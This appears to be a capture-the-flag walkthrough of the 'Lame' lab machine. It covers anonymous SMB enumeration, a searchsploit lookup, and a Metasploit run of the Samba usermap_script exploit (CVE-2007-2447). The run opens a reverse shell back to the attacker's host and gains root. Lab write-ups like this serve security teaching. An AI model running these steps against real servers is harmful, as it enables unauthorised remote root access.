## Checking shares
```
┌──(kali㉿kali)-[~]
└─$ smbclient -L //10.10.10.3                                            
Password for [WORKGROUP\kali]:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        tmp             Disk      oh noes!
        opt             Disk      
        IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
        ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            LAME

```

## tmp
```
┌──(kali㉿kali)-[~]
└─$ smbclient  //10.10.10.3/tmp                                      
Password for [WORKGROUP\kali]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Sep 12 09:07:21 2025
  ..                                 DR        0  Sat Oct 31 00:33:58 2020
  5550.jsvc_up                        R        0  Fri Sep 12 08:16:22 2025
  .ICE-unix                          DH        0  Fri Sep 12 08:15:19 2025
  vmware-root                        DR        0  Fri Sep 12 08:15:52 2025
  .X11-unix                          DH        0  Fri Sep 12 08:15:45 2025
  .X0-lock                           HR       11  Fri Sep 12 08:15:45 2025
  vgauthsvclog.txt.0                  R     1600  Fri Sep 12 08:15:17 2025

                7282168 blocks of size 1024. 5386528 blocks available
smb: \> cd vmware-root\
smb: \vmware-root\> ls
NT_STATUS_ACCESS_DENIED listing \vmware-root\*


```
The rest are denied.
## Searching for vulnerabilities
```
┌──(kali㉿kali)-[~]
└─$ searchsploit samba 3.0.20        
------------------------------------------- ---------------------------------
 Exploit Title                             |  Path
------------------------------------------- ---------------------------------
Samba 3.0.10 < 3.3.5 - Format String / Sec | multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map  | unix/remote/16320.rb
Samba < 3.0.20 - Remote Heap Overflow      | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (P | linux_x86/dos/36741.py
------------------------------------------- ------------------------------

```

# msfconsole
```
msf > search samba 3.0.20

Matching Modules
================

   #  Name                                Disclosure Date  Rank       Check  Description
   -  ----                                ---------------  ----       -----  -----------
   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/samba/usermap_script

msf > info 0

       Name: Samba "username map script" Command Execution
     Module: exploit/multi/samba/usermap_script
   Platform: Unix
       Arch: cmd
 Privileged: Yes
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2007-05-14

Provided by:
  jduck <jduck@metasploit.com>

Module side effects:
 unknown-side-effects

Module stability:
 unknown-stability

Module reliability:
 unknown-reliability

Available targets:
      Id  Name
      --  ----
  =>  0   Automatic

Check supported:
  No

Basic options:
  Name    Current Setting  Required  Description
  ----    ---------------  --------  -----------
  RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
  RPORT   139              yes       The target port (TCP)

Payload information:
  Space: 1024

Description:
  This module exploits a command execution vulnerability in Samba
  versions 3.0.20 through 3.0.25rc3 when using the non-default
  "username map script" configuration option. By specifying a username
  containing shell meta characters, attackers can execute arbitrary
  commands.

  No authentication is needed to exploit this vulnerability since
  this option is used to map usernames prior to authentication!

References:
  https://nvd.nist.gov/vuln/detail/CVE-2007-2447
  OSVDB (34700)
  http://www.securityfocus.com/bid/23972
  http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=534
  http://samba.org/samba/security/CVE-2007-2447.html


View the full module info with the info -d command.

```

## Exploitation
```
msf exploit(multi/samba/usermap_script) > set RHOSTS 10.10.10.3
RHOSTS => 10.10.10.3
msf exploit(multi/samba/usermap_script) > set LHOST tun0
LHOST => 10.10.14.9
msf exploit(multi/samba/usermap_script) > run
[*] Started reverse TCP handler on 10.10.14.9:4444 
[*] Command shell session 1 opened (10.10.14.9:4444 -> 10.10.10.3:55513) at 2025-09-13 09:19:12 -0600

whoami
root
id
uid=0(root) gid=0(root)

```